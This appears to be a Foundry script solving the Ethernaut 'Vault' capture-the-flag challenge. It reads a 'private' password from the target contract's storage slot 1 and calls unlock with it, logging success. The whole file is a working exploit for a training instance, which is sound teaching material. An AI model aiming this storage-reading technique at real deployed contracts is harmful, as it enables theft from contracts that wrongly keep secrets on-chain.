// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IVault} from "../src/interfaces/IVault.sol";

contract VaultScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");

        IVault target = IVault(instance);

        console2.log("--- Vault Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Locked Before  :", target.locked());

        // Read Slot 1 from target contract storage
        // Slot 0: bool locked
        // Slot 1: bytes32 private password
        bytes32 password = vm.load(instance, bytes32(uint256(1)));
        console2.log("Leaked Password from Slot 1:");
        console2.logBytes32(password);

        vm.startBroadcast(privateKey);

        // Call unlock with the recovered password
        target.unlock(password);

        vm.stopBroadcast();

        console2.log("Locked After   :", target.locked());
        require(!target.locked(), "Exploit failed: Vault is still locked");
        console2.log(">>> SUCCESS! Vault unlocked! Submit instance in Ethernaut. <<<");
    }
}
